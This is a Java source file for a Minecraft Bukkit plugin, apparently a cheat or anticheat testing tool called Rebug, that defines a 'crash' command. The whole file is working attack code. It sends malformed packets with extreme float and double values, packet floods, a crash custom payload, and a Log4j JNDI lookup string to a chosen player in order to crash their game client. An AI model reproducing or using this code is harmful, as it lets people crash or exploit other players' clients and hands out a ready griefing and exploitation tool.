package me.killstorm103.Rebug.Commands;

import java.util.ArrayList;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import me.killstorm103.Rebug.Main.Command;
import me.killstorm103.Rebug.Utils.PT;
import net.minecraft.server.v1_8_R3.*;

public class Crasher extends Command
{

	@Override
	public String getName() {
		return "crash";
	}

	@Override
	public String getSyntax() {
		return "crash <Crash Exploit> <Crash Victim> ...";
	}

	@Override
	public String getDescription() {
		return "crash players or the server";
	}
	@Override
	public String getPermission() {
		return "me.killstorm103.rebug.commands.crasher";
	}
	
	@Override
	public void onCommand(CommandSender sender, String[] args) throws Exception 
	{
	//	Log(sender, "args[1]= " + args[1] + " args[2]= " + args[2] + " args[3]= " + args[3]);
		Player player = null, Crash_Victim = null;
		if (sender instanceof Player)
		{
			player = (Player) sender;
		}
		if (args.length < 1)
		{
			Log(sender, getSyntax());
			return;
		}
		String mode = args[1];
		if (mode == null || mode.length() < 1)
		{
			Log(sender, getSyntax());
			return;
		}
		Packet<?> packet = null;
		if (mode.equalsIgnoreCase("server")) // TODO Make
		{
		}
		if (args.length < 2)
		{
			sender.sendMessage(getSyntax());
			return;
		}
		
		Crash_Victim = getRebug().getServer().getPlayer(args[2]); 
		if (Crash_Victim == null)
		{
			Log(sender, "Unknown Player!");
			return;
		}
		if (mode.equalsIgnoreCase("Test"))
		{
			
		}
		if (mode.equalsIgnoreCase("NumbWare"))
		{
			ByteBuf buf = Unpooled.buffer(256);
			buf.setByte(0, (byte)0);
			buf.writerIndex(1);
			packet = new PacketPlayOutCustomPayload("NWS|Crash Bed",
		    new PacketDataSerializer(buf));
			PT.SendPacket(Crash_Victim, packet);
			Log(sender, "tried crashing " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("Explosion"))
		{
			ArrayList<BlockPosition> list = new ArrayList<BlockPosition>();
            Vec3D v = new Vec3D(Crash_Victim.getLocation().getX(), Crash_Victim.getLocation().getY(), Crash_Victim.getLocation().getZ());
            PacketPlayOutExplosion p = new PacketPlayOutExplosion(Crash_Victim.getLocation().getX(), Crash_Victim.getLocation().getY(), Crash_Victim.getLocation().getZ(), Float.MAX_VALUE, list, v);
            PT.SendPacket(Crash_Victim, p);
            Log(sender, "tried crashing " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("Particle"))
		{
			float red = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), green = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), blue = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE);
            for (int i = 0; i < EnumParticle.values().length; i ++)
            {
            	packet = new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0});
                PT.SendPacket(Crash_Victim, packet);
            }
            Log(sender, "tried crashing " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("GameState"))
		{
			packet = new PacketPlayOutGameStateChange(7, (float) (PT.nextBoolean() ? PT.randomNumber(Float.MAX_VALUE, 500) : PT.randomNumber(-Float.MAX_VALUE, -500)));
			PT.SendPacket(Crash_Victim, packet);
			Log(sender, "tried crashing " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("Log4j"))
		{
			String str = "\\${jndi:ldap://192.168." + PT.nextInt(1, 253) + "." + PT.nextInt(1, 253) + "}";
			ChatComponentText text = new ChatComponentText("/tell " + PT.randomString(10) + " " + str);
			packet = new PacketPlayOutChat (text, (byte) 1);
			PT.SendPacket(Crash_Victim, packet);
			Log(sender, "Tried using the Log4j Crash Exploit on " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("Position"))
		{
			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
			{
				packet =
				new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i));
				PT.SendPacket(Crash_Victim, packet);
			}
			Log(sender, "tried crashing " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("SpawnEntity") || mode.equalsIgnoreCase("Entity"))
		{
			if (args.length < 3)
			{
				sender.sendMessage("/rebug crash spawnentity/entity <player> <spawn entity>");
				return;
			}
			PT.CrashPlayer(sender, Crash_Victim, args[3]);
			Log(sender, "tried crashing " + Crash_Victim.getName());
		}
	}
	
}
